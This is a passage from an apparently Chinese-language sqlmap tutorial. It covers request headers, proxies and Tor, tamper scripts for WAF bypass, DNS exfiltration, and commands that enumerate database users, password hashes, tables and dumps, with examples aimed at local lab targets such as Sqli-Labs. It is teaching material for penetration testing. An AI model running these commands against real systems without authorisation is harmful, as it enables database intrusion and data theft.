src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020440.png" alt="img"></p><h3 id="2-8-设置-额外-HTTP-头"><a href="#2-8-设置-额外-HTTP-头" class="headerlink" title="2.8 设置 额外 HTTP 头"></a>2.8 设置 额外 HTTP 头</h3><p>通过设置选项–header， 可以提供额外的HTTP标头。 每个标头必须用换行符（\n）分隔， 从配置INI文件中提供它们要容易得多。 可以查看示例sqlmap.conf文件。</p><p>例如： python sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1”</a> –headers&#x3D;“Host:<a href="http://www.target.com/nUser-agent:Firefox">www.target.com\nUser-agent:Firefox</a> 1.0” -v 5</p><p>以Sqli-Labs靶场的Sqli-Less1为例 将User-Agent设为：haha 将cookie设为:heihei</p><p>sqlmap -u “<a href="http://192.168.1.2/sqlilabs/Less-1/?id=1%E2%80%9D">http://192.168.1.2/sqlilabs/Less-1/?id=1”</a> –headers&#x3D;“user-agent:haha\ncookie:heihei” </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020619.png" alt="img"></p><h3 id="2-9-设置-HTTP-协议认证"><a href="#2-9-设置-HTTP-协议认证" class="headerlink" title="2.9 设置 HTTP 协议认证"></a>2.9 设置 HTTP 协议认证</h3><p>Sqlmap中设置HTTP协议认证的参数： –auth-type和–auth-cred</p><p>其中–auth-type支持 Basic、 Digest、 NTLM</p><p>–auth-cred认证语法为： username:password （用于需要账号密码登录的页面）</p><p>例如： python sqlmap.py -u “<a href="http://url/arit.php?id=1%E2%80%9D">http://url/arit.php?id=1”</a> –auth-type Basic –auth-cred “testuser:testpass”</p><h3 id="2-10-设置-HTTP-代理"><a href="#2-10-设置-HTTP-代理" class="headerlink" title="2.10 设置 HTTP 代理"></a>2.10 设置 HTTP 代理</h3><p>Sqlmap中设置代理的参数： –proxy, –proxy-cred, –proxy-file ， –ignore-proxy</p><p>其中–proxy用来设置HTTP代理服务器位置 格式： –proxy http(s): &#x2F;&#x2F;ip[:端口]</p><p>–proxy-cred用来设置HTTP代理服务器认证信息 格式： –proxy-cred username:password</p><p>–proxy-file用来设置多条代理在文件中</p><p>–ignore-proxy当您希望通过忽略系统范围内的HTTP(S)代理服务器设置来针对本地网络的目标部分运行sqlmap时， 应该使用这种方法。</p><h2 id="0x03-sqlmap-请求参数设置（二）"><a href="#0x03-sqlmap-请求参数设置（二）" class="headerlink" title="0x03 sqlmap 请求参数设置（二）"></a>0x03 sqlmap 请求参数设置（二）</h2><h3 id="3-1-设置Tor隐藏网络"><a href="#3-1-设置Tor隐藏网络" class="headerlink" title="3.1 设置Tor隐藏网络"></a>3.1 设置Tor隐藏网络</h3><p>Sqlmap中设置Tor网络的参数： –tor –tor-port –tor-type（共有四种类型：HTTP、HTTPS、SOCKS4、SOCKS5） –check-tor</p><h3 id="3-2-设置延时"><a href="#3-2-设置延时" class="headerlink" title="3.2 设置延时"></a>3.2 设置延时</h3><p>Sqlmap探测过程中会发送大量探测Payload到目标， 如果默认情况过快的发包速度回导致目标预警或断开连接。 为了避免这样的情况发生， 可以在探测设置Sqlm1ap发包延迟。 默认情况下， 不设置延迟。 –delay 0.5 设置延迟0.5秒</p><h3 id="3-3-设置超时"><a href="#3-3-设置超时" class="headerlink" title="3.3 设置超时"></a>3.3 设置超时</h3><p>在考虑超时HTTP(S)请求之前， 可以指定等待的秒数。 有效值是一个浮点数， 例如10.5表示10秒半。 默认设置为30秒。 例如： –timeout 10.5</p><h3 id="3-4-设置重传次数"><a href="#3-4-设置重传次数" class="headerlink" title="3.4 设置重传次数"></a>3.4 设置重传次数</h3><p>–retries count 设置对应重试次数， 默认情况下重试3次。（通常与超时参数结合使用）</p><h3 id="3-5-设置随机化参数"><a href="#3-5-设置随机化参数" class="headerlink" title="3.5 设置随机化参数"></a>3.5 设置随机化参数</h3><p>Sqlmap可以指定要在每次请求期间随机更改其值的参数名称。 长度和类型根据提供的原始值保持一直。 –randomize 参数名称</p><p>例如： </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020284.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020240.png" alt="img"></p><h3 id="3-6-设置日志过滤目标"><a href="#3-6-设置日志过滤目标" class="headerlink" title="3.6 设置日志过滤目标"></a>3.6 设置日志过滤目标</h3><p>与使用选项-l使用从提供的日志解析的所有主机不同， 您可以指定有效的Python正则表达式， 用于过滤所需的日志。</p><p>例如： python sqlmap.py -l burp.log –scope&#x3D;”(www)?.target.(com|net|org)”</p><p>–scope&#x3D; ” 正则表达式 “</p><h3 id="3-7-设置忽略-401"><a href="#3-7-设置忽略-401" class="headerlink" title="3.7 设置忽略 401"></a>3.7 设置忽略 401</h3><p>–ignore-401 参数用来忽略未验证错误。</p><p>如果您想测试偶尔返回HTTP错误401(未经授权的)的站点，而您想忽略它并在不提供适当凭证的情况下继续测试，您可以使用–ignore-401</p><h3 id="3-8-设置-HTTP-协议私钥"><a href="#3-8-设置-HTTP-协议私钥" class="headerlink" title="3.8 设置 HTTP 协议私钥"></a>3.8 设置 HTTP 协议私钥</h3><p>当web服务器需要适当的客户端证书和用于<a href="https://cloud.tencent.com/product/faceid?from_column=20065&from=20065">身份验证</a>的私钥时，应该使用此选项。提供的值应该是一个PEM格式的key_file，其中包含证书和私钥。</p><p>–auth-file 文件名</p><h3 id="3-9-设置安全模式"><a href="#3-9-设置安全模式" class="headerlink" title="3.9 设置安全模式"></a>3.9 设置安全模式</h3><p>避免在多次请求失败后销毁会话</p><p>有时，如果执行了一定数量的不成功请求，则在此期间的web应用程序或检查技术会销毁会话。这可能发生在sqlmap的检测阶段或利用任何盲SQL注入类型时。原因是SQL有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。</p><p>–safe-url, –safe-post, –safe-req –safe-freq</p><p>通过这种方式，sqlmap将访问每个预定义数量的请求，而不对某个安全URL执行任何类型的注入。</p><h3 id="3-10-设置忽略URL编码"><a href="#3-10-设置忽略URL编码" class="headerlink" title="3.10 设置忽略URL编码"></a>3.10 设置忽略URL编码</h3><p>据参数的位置(例如GET)，默认情况下它的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。在这种情况下使用–skip-urlencode。</p><p>–skip-urlencode 不进行URL加密</p><h2 id="0x04-sqlmap-性能优化"><a href="#0x04-sqlmap-性能优化" class="headerlink" title="0x04 sqlmap 性能优化"></a>0x04 sqlmap 性能优化</h2><h3 id="4-1-设置持久-HTTP-连接"><a href="#4-1-设置持久-HTTP-连接" class="headerlink" title="4.1 设置持久 HTTP 连接"></a>4.1 设置持久 HTTP 连接</h3><p>Sqlmap中可以设置连接为持久连接。 HTTP报文中设置 Connection: Keep-Alive。（通过减少连接次数来提升性能） 参数： –keep-alive 注意该参数与 -proxy参数不兼容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022029956.png" alt="img"></p><h3 id="4-2-设置-HTTP-空连接"><a href="#4-2-设置-HTTP-空连接" class="headerlink" title="4.2 设置 HTTP 空连接"></a>4.2 设置 HTTP 空连接</h3><p>Sqlmap中设置空连接， 表示直接获得HTTP响应的大小而不用获得HTTP响应体。 常用在盲注判断真&#x2F;假中，降低网络带宽消耗。 参数： –null-connection 注意这个参数，与–text-only参数不兼容 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020235.png" alt="img"></p><h3 id="4-3-设置多线程"><a href="#4-3-设置多线程" class="headerlink" title="4.3 设置多线程"></a>4.3 设置多线程</h3><p>Sqlmap中设置同时发送多少个HTTP请求的多线程。</p><p>–threads 默认是1个线程。 为了不影响目标站点服务器的性能， Sqlmap可以设置最大的线程数为10。</p><h3 id="4-5-设置预测输出"><a href="#4-5-设置预测输出" class="headerlink" title="4.5 设置预测输出"></a>4.5 设置预测输出</h3><p>Sqlmap中的预测输出， 在推理算法中用于检索值字符的顺序统计预测。 参数： –predict-output</p><p>注意这个参数与 –thread参数不兼容。</p><p><em><strong>使用 -o 参数可开启前面三个性能参数（–keep-alive 、–null-connection 、 –predict-output），不开启 –threads参数</strong></em></p><h2 id="0x05-sqlmap-注入位置介绍"><a href="#0x05-sqlmap-注入位置介绍" class="headerlink" title="0x05 sqlmap 注入位置介绍"></a>0x05 sqlmap 注入位置介绍</h2><h3 id="5-0-注入介绍"><a href="#5-0-注入介绍" class="headerlink" title="5.0 注入介绍"></a>5.0 注入介绍</h3><p>所谓SQL注入， 就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串， 最终达到欺骗服务器执行恶意的SQL命令。 具体来说， 它是利用现有应用程序， 将（恶意的） SQL命令注入到后台数据库引擎执行的能力， 它可以通过在Web表单中输入（恶意） SQL语句得到一个存在安全漏洞的网站上的数据库， 而不是按照设计者意图去执行SQL语句。</p><p>由此可见： SQL注入发生位置 HTTP数据包中任意位置</p><h3 id="5-1-设置指定注入参数"><a href="#5-1-设置指定注入参数" class="headerlink" title="5.1 设置指定注入参数"></a>5.1 设置指定注入参数</h3><p>Sqlmap测试参数 -p, –skip –param-exclude –skip-static</p><p>-p ： 指定具体探测的参数。 例如： -p “id,user-agent”</p><p>–skip： 忽略探测具体的参数。 例如： –level –skip “user-agent,referer”</p><p>–param-exclude： 忽略包含具体内容的参数。 例如： –param-exclude&#x3D;“token|session” 不对包含token或session的参数进行探测。</p><p>–skip-static： 忽略非动态参数</p><h3 id="5-2-设置URL注入位置"><a href="#5-2-设置URL注入位置" class="headerlink" title="5.2 设置URL注入位置"></a>5.2 设置URL注入位置</h3><p>当注入点位于URL本身内部时， 会出现一些特殊情况。 除非手动指向URL路径， 否则sqlmap不会对URL路径执行任何自动测试。 必须在命令行中添加星号(*)来指定这些注入点。</p><p>例如， 当使用Apache web服务器的mod_rewrite模块或其他类似的技术时， 这就显得特别有用了</p><p>python sqlmap.py -u <a href="http://targeturl/param1/value1*/param2/value2/">http://targeturl/param1/value1*/param2/value2/</a></p><h3 id="5-3-设置任意注入位置"><a href="#5-3-设置任意注入位置" class="headerlink" title="5.3 设置任意注入位置"></a>5.3 设置任意注入位置</h3><p>与URL注入点类似， 星号(*)(注意:这里也支持Havij样式%INJECT %)也可以用来指向GET、POST或HTTP头中的任意注入点。 注入点可以通过在带有选项-u的GET参数值、 带有选项–data数据的POST参数值、 带有选项-H的HTTP（header）头值、 带有选项-A的User_Agent头、 用户代理、 引用和&#x2F;或cookie的HTTP头值中指定， 或者在带有选项-r的文件中加载的HTTP请求的通用位置指定。</p><p>python sqlmap.py -u “<a href="http://targeturl”/">http://targeturl”</a> –cookie&#x3D;”param1&#x3D;value1*;param2&#x3D;value2</p><h2 id="0x06-sqlmap-注入参数"><a href="#0x06-sqlmap-注入参数" class="headerlink" title="0x06 sqlmap 注入参数"></a>0x06 sqlmap 注入参数</h2><h3 id="6-1-强制设置-DBMS"><a href="#6-1-强制设置-DBMS" class="headerlink" title="6.1 强制设置 DBMS"></a>6.1 强制设置 DBMS</h3><p>默认情况下Sqlmap会自动识别探测目标Web应用程序的后端<a href="https://cloud.tencent.com/product/dmc?from_column=20065&from=20065">数据库管理</a>系统（DBMS） ， 以下列出</p><p>Sqlmap完全支持的DBMS种类：</p><p>Mysql、 Oracle、 Microsoft SQL Server、 IBM DB2、 SQLite、 Firebird、 Sybase、 SAP MaxDB、HSQLDB、 Informix</p><p>–dbms 数据库管理系统名称 [版本号]</p><p>例如： –dbms mysql 5.0 、 –dbms microsoft sql server 05</p><h3 id="6-2-强制设置-OS"><a href="#6-2-强制设置-OS" class="headerlink" title="6.2 强制设置 OS"></a>6.2 强制设置 OS</h3><p>默认情况下Sqlmap会自动识别探测目标Web应用程序的后端操作系统（OS） ， 以下列出Sqlmap完全支持的OS种类。 Linux 、 Windows</p><p>请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。 例如： –os windows 或 –os linux</p><p>请注意， 此选项不是强制性的， 强烈建议只在完全确定底层操作系统的后端数据库管理系统时才使用它。 如果不知道它， 让sqlmap自动为您识别它。</p><h3 id="6-3-关闭负载转换机制"><a href="#6-3-关闭负载转换机制" class="headerlink" title="6.3 关闭负载转换机制"></a>6.3 关闭负载转换机制</h3><p>在检索结果时， sqlmap使用一种机制， 在这种机制中， 所有条目都被转换为字符串类型， 并在NULL值的情况下用空格字符替换。 这样做是为了防止出现任何错误状态(例如， 将空值与字符串值连接起来)， 并简化数据检索过程本身。 尽管如此， 还是有报告的案例(例如MySQL DBMS的旧版本)由于数据检索本身的问题(例如没有返回值)需要关闭这种机制(使用此开关)。</p><p>–no-cast</p><h3 id="6-4-关闭字符转义机制"><a href="#6-4-关闭字符转义机制" class="headerlink" title="6.4 关闭字符转义机制"></a>6.4 关闭字符转义机制</h3><p>在sqlmap需要在有效负载中使用(单引号分隔)字符串值(例如， 选择’foobar’)时， 这些值将自动转义(例如， 选择CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))。这样做的原因有两个:混淆有效负载内容和防止后端服务器上查询转义机制(例如magic_quotes和&#x2F;或mysql_real_escape_string)的潜在问题。 用户可以使用这个开关关闭它(例如减少有效负载大小)。</p><p>–no-escape（一般不建议关闭）</p><h3 id="6-5-强制设置无效值替换"><a href="#6-5-强制设置无效值替换" class="headerlink" title="6.5 强制设置无效值替换"></a>6.5 强制设置无效值替换</h3><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用大整数值来实现相同的目标(例如id&#x3D;99999999)。 –invalid-bignum</p><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用布尔操作来实现相同的目标(例如id&#x3D;13 and18&#x3D;19)。 –invalid-logical</p><p>在sqlmap需要使原始参数值无效(例如id&#x3D;13)时，它使用经典的否定(例如id&#x3D;-13)。有了这个开关，就可以强制使用随机字符串来实现相同的目标(例如id&#x3D;akewmc)。 –invalid-string</p><h3 id="6-6-自定义注入负载位置"><a href="#6-6-自定义注入负载位置" class="headerlink" title="6.6 自定义注入负载位置"></a>6.6 自定义注入负载位置</h3><p>在某些情况下，只有当用户提供要附加到注入负载的特定后缀时，易受攻击的参数才可被利用。当用户已经知道查询语法并希望通过直接提供注入有效负载前缀和后缀来检测和利用SQL注入时，这些选项就派上用场了。 –prefix 设置SQL注入Payload前缀 –suffix 设置SQL注入Payload后缀</p><p>例如： SQL查询语句为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27; . $_GET[&#x27;id&#x27;] . &#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p>sqlmap参数使用： python sqlmap.py -u “<a href="http://ip/sqlmap/mysql/get_str_brackets.php">http://ip/sqlmap/mysql/get_str_brackets.php</a> ?id&#x3D;1” -p id –prefix “’)” –suffix “AND (‘abc’&#x3D;’abc”</p><p>插入Payload后的SQL查询语句：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;1&#x27;) &lt;PAYLOAD&gt; AND (&#x27;abc&#x27;=&#x27;abc&#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023912.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023306.png" alt="img"></p><h3 id="6-7-设置-Tamper-脚本"><a href="#6-7-设置-Tamper-脚本" class="headerlink" title="6.7 设置 Tamper 脚本"></a>6.7 设置 Tamper 脚本</h3><p>sqlmap本身不会混淆发送的有效负载，除了单引号之间的字符串被CHAR()类似的表示形式所取代之外。sqlmap通过Tamper脚本来绕过WAF等防御措施，可以在tamper文件夹下找到所有sqlmap自带的tamper脚本。</p><p>sqlmap.py -u “<a href="http://ip/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://ip/sqlmap/mysql/get_int.php?id=1”</a> –tamper“between.py,randomcase.py,space2comment.py” -v 3</p><h3 id="6-8-设置-DBMS-认证"><a href="#6-8-设置-DBMS-认证" class="headerlink" title="6.8 设置 DBMS 认证"></a>6.8 设置 DBMS 认证</h3><p>设置DBMS认证方式通过以下命令：</p><p>–dbms-cred &#x3D; username:password</p><h2 id="0x07-sqlmap-自定义检测参数"><a href="#0x07-sqlmap-自定义检测参数" class="headerlink" title="0x07 sqlmap 自定义检测参数"></a>0x07 sqlmap 自定义检测参数</h2><h3 id="7-1-设置探测等级"><a href="#7-1-设置探测等级" class="headerlink" title="7.1 设置探测等级"></a>7.1 设置探测等级</h3><p>–level 此选项需要指定要执行的测试等级的参数。有五个层次。在执行有限数量的测试(请求)时，默认值为1。1~5探测复杂逐步提升。</p><p>sqlmap使用的有效负载在文本文件xml&#x2F;payload .xml中指定。按照文件顶部的说明，如果sqlmap错过了注入，您也应该能够添加自己的有效负载来进行测试!</p><p>这个选项不仅会影响到哪个有效负载sqlmap尝试，还会影响到在考试中取哪个注入点:GET和POST参数总是被测试，HTTP Cookie头值从第2级测试，HTTP用户代理&#x2F;引用头值从第3级测试。</p><p>总之，检测SQL注入越困难，必须设置的——级别就越高。 在显示无法注入时，可以设置 –level 5 来进行更强大的探测</p><h3 id="7-2-设置风险参数"><a href="#7-2-设置风险参数" class="headerlink" title="7.2 设置风险参数"></a>7.2 设置风险参数</h3><p>此选项需要指定要执行测试的风险的参数。有三个风险值。默认值为1，这对于大多数SQL注入点来说是无害的。风险值2增加了大量基于查询时间的SQL注入测试的默认级别，值3也增加了基于or的SQL注入测试。</p><p>在某些情况下，比如UPDATE语句中的SQL注入，注入基于or的有效负载可能导致表的所有条目的更新，这肯定不是攻击者想要的。出于这个原因和其他原因，我们引入了这个选项:用户可以控制测试的有效负载，用户可以任意选择使用也有潜在危险的负载。</p><p>例如： –risk num num范围 1~3</p><h3 id="7-3-设置页面比较参数"><a href="#7-3-设置页面比较参数" class="headerlink" title="7.3 设置页面比较参数"></a>7.3 设置页面比较参数</h3><p>默认情况下，通过比较注入的请求页面内容和未注入的原始页面内容，可以区分真查询和假查询。这种观念并不总是起作用是因为在每次刷新页面内容的变化有时甚至没有注射,例如当页面有一个计数器,一个动态广告横幅或任何其他HTML的一部分呈现动态和可能改变时间不仅因此用户的输入。为了绕过这个限制，sqlmap努力识别响应体的这些片段并进行相应处理。</p><p>–string：指定包含字符串 查询为True –not-string：指定包含字符串 查询为False –regexp：指定通过正则表达式匹配字符串,查询为True –code：指定匹配HTTP状态响应码，查询为True</p><h3 id="7-4-设置内容比较参数"><a href="#7-4-设置内容比较参数" class="headerlink" title="7.4 设置内容比较参数"></a>7.4 设置内容比较参数</h3><p>–text-only：设置页面内容中包含文本。</p><p>例如：–text-only &#x3D; “Welcome for True and Forbidden for False”</p><p>–titles：设置页面title中包含文本。前提需要知道如何区分查询的真与假，根据返回字符串内容不同。 –titles&#x3D;”Login”</p><h2 id="0x08-sqlmap-注入技术参数"><a href="#0x08-sqlmap-注入技术参数" class="headerlink" title="0x08 sqlmap 注入技术参数"></a>0x08 sqlmap 注入技术参数</h2><h3 id="8-1-设置具体-SQL-注入技术"><a href="#8-1-设置具体-SQL-注入技术" class="headerlink" title="8.1 设置具体 SQL 注入技术"></a>8.1 设置具体 SQL 注入技术</h3><p>–technique 参数用来设置具体SQL注入技术。以下列出Sqlmap支持的SQL注入技术。</p><p>B: Boolean-based blind 基于布尔的盲注 E: Error-based 报错注入 U: Union query-based Union查询注入 S: Stacked queries 堆叠注入 T: Time-based blind 基于时间的盲注 Q: Inline queries 内联查询注入</p><p>例如：sqlmap -u “存在注入点的URL” –technique B –current-db 利用基于布尔的盲注对注入点进行SQL注入探测</p><h3 id="8-2-设置时间盲注延迟时间"><a href="#8-2-设置时间盲注延迟时间" class="headerlink" title="8.2 设置时间盲注延迟时间"></a>8.2 设置时间盲注延迟时间</h3><p>在测试基于时间的盲SQL注入时，可以设置秒来延迟响应，方法是提供–time-sec选项，后面跟着一个整数。默认情况下，它的值设置为5秒。</p><p>例如： sqlmap -u “存在注入点的URL” –time-sec 3 –current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020200.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020601.png" alt="img"></p><h3 id="8-3-设置-UNION-字段数"><a href="#8-3-设置-UNION-字段数" class="headerlink" title="8.3 设置 UNION 字段数"></a>8.3 设置 UNION 字段数</h3><p>默认情况下，sqlmap测试使用1到10列的UNION查询SQL注入技术。但是，通过提供更高–level值，可以将此范围增加到50列。</p><p>您可以手动告诉sqlmap使用特定范围的列来测试这种类型的SQL注入，方法是为该工具提供选–union-cols后跟一系列整数。例如，12-16表示使用12到16个列对UNION查询SQL注入进行测试。</p><p>例如：sqlmap -u “存在注入的URL” –union-cols 12-18 –current-db</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023721.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020336.png" alt="img"></p><h3 id="8-4-设置-UNION-字符"><a href="#8-4-设置-UNION-字符" class="headerlink" title="8.4 设置 UNION 字符"></a>8.4 设置 UNION 字符</h3><p>默认情况下，sqlmap测试使用空字符的联合查询SQL注入技术。但是，通过提供更高级别的值sqlmap，还将使用随机数执行测试，因为在某些情况下，UNION查询测试使用NULL会失败，而使用随机整数则会成功。</p><p>您可以手动告诉sqlmap使用特定字符测试这种类型的SQL注入，方法是使用带有所需字符值的选项–union-char(例如–union-char 123)。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023060.png" alt="img"></p><h3 id="8-5-设置-UNION-查询表"><a href="#8-5-设置-UNION-查询表" class="headerlink" title="8.5 设置 UNION 查询表"></a>8.5 设置 UNION 查询表</h3><p>某些情况下，Sqlmap需要设定Union 查询SQL注入的具体数据表才可以得到数据。 –union-from 表名 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020332.png" alt="img"></p><h3 id="8-6-设置-DNS-露出攻击"><a href="#8-6-设置-DNS-露出攻击" class="headerlink" title="8.6 设置 DNS 露出攻击"></a>8.6 设置 DNS 露出攻击</h3><p>针对目标网络很有可能对外部流量进行限制，或者设置WAF。</p><p>通过设置DNS流量来突破限制 –dns-domain “dns服务器” 需要用户自身具有一个开放53端口的DNS服务器，通过DNS流量来获得Web应用程序中数据内容。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020213.png" alt="img"></p><h3 id="8-7-设置二次注入"><a href="#8-7-设置二次注入" class="headerlink" title="8.7 设置二次注入"></a>8.7 设置二次注入</h3><p>Sqlmap中可以设置二次注入的结果页面。 –second-url URL </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020417.png" alt="img"></p><h3 id="8-8-识别指纹"><a href="#8-8-识别指纹" class="headerlink" title="8.8 识别指纹"></a>8.8 识别指纹</h3><p>–fingerprint -f 探测目标指纹信息。 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023448.png" alt="img"></p><h2 id="0x09-sqlmap-检索-DBMS-信息"><a href="#0x09-sqlmap-检索-DBMS-信息" class="headerlink" title="0x09 sqlmap 检索 DBMS 信息"></a>0x09 sqlmap 检索 DBMS 信息</h2><h3 id="9-1-检索-DBMS-Banner-信息"><a href="#9-1-检索-DBMS-Banner-信息" class="headerlink" title="9.1 检索 DBMS Banner 信息"></a>9.1 检索 DBMS Banner 信息</h3><p>获取后端数据库Banner信息。 –banner或者 -b </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023235.png" alt="img"></p><h3 id="9-2-检索-DBMS-当前用户"><a href="#9-2-检索-DBMS-当前用户" class="headerlink" title="9.2 检索 DBMS 当前用户"></a>9.2 检索 DBMS 当前用户</h3><p>获取DBMS当前用户 –current-user </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020891.png" alt="img"></p><h3 id="9-3-检索-DBMS-当前数据库"><a href="#9-3-检索-DBMS-当前数据库" class="headerlink" title="9.3 检索 DBMS 当前数据库"></a>9.3 检索 DBMS 当前数据库</h3><p>获取当前数据库名。 –current-db </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024028.png" alt="img"></p><h3 id="9-4-检索-DBMS-当前主机名"><a href="#9-4-检索-DBMS-当前主机名" class="headerlink" title="9.4 检索 DBMS 当前主机名"></a>9.4 检索 DBMS 当前主机名</h3><p>–hostname </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020400.png" alt="img"></p><h2 id="0x0A-sqlmap-枚举-DBMS-信息"><a href="#0x0A-sqlmap-枚举-DBMS-信息" class="headerlink" title="0x0A sqlmap 枚举 DBMS 信息"></a>0x0A sqlmap 枚举 DBMS 信息</h2><h3 id="10-1-探测当前用户-DBA"><a href="#10-1-探测当前用户-DBA" class="headerlink" title="10.1 探测当前用户 DBA"></a>10.1 探测当前用户 DBA</h3><p>–is-dba 探测当前用户是否是数据库管理员。</p><p>若返回True，则说明当前用户是数据库管理员 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024791.png" alt="img"></p><h3 id="10-2-枚举-DBMS-用户"><a href="#10-2-枚举-DBMS-用户" class="headerlink" title="10.2 枚举 DBMS 用户"></a>10.2 枚举 DBMS 用户</h3><p>获取DBMS所有用户 –users</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020245.png" alt="img"></p><h3 id="10-3-枚举-DBMS-用户密码"><a href="#10-3-枚举-DBMS-用户密码" class="headerlink" title="10.3 枚举 DBMS 用户密码"></a>10.3 枚举 DBMS 用户密码</h3><p>–password 获取用户密码</p><h3 id="10-4-枚举-DBMS-权限"><a href="#10-4-枚举-DBMS-权限" class="headerlink" title="10.4 枚举 DBMS 权限"></a>10.4 枚举 DBMS 权限</h3><p>–privileges –role(角色) </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024501.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024378.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020399.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020080.png" alt="img"></p><h3 id="10-5-枚举数据库名"><a href="#10-5-枚举数据库名" class="headerlink" title="10.5 枚举数据库名"></a>10.5 枚举数据库名</h3><p>–dbs 列举数据库名称 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020994.png" alt="img"></p><h3 id="10-6-枚举数据库表"><a href="#10-6-枚举数据库表" class="headerlink" title="10.6 枚举数据库表"></a>10.6 枚举数据库表</h3><p>–tables 枚举表名 –&gt; 指定具体数据库 -D 数据库名 –exclude-sysdbs 只列出用户自己新建的数据库和表 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024510.png" alt="img"></p><p> （排除DBMS系统数据库，当枚举表时）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024789.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024774.png" alt="img"></p><h3 id="10-7-枚举数据库表的列名"><a href="#10-7-枚举数据库表的列名" class="headerlink" title="10.7 枚举数据库表的列名"></a>10.7 枚举数据库表的列名</h3><p>–columns -D指定数据库 -T指定数据表 -C指定具体字段 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020147.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024183.png" alt="img"></p><h3 id="10-8-枚举数据值"><a href="#10-8-枚举数据值" class="headerlink" title="10.8 枚举数据值"></a>10.8 枚举数据值</h3><p>–dump </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020572.png" alt="img"></p><h2 id="0x0B-sqlmap-枚举信息"><a href="#0x0B-sqlmap-枚举信息" class="headerlink" title="0x0B sqlmap 枚举信息"></a>0x0B sqlmap 枚举信息</h2><h3 id="11-1-枚举-schema-信息"><a href="#11-1-枚举-schema-信息" class="headerlink" title="11.1 枚举 schema 信息"></a>11.1 枚举 schema 信息</h3><p>用户可以使用此开关–schema检索DBMS模式。模式列表将包含所有数据库、表和列，以及它们各自的类型。与–exclude-sysdb结合使用时，只会检索和显示包含非系统数据库的模式的一部分。</p><p>python sqlmap.py -u 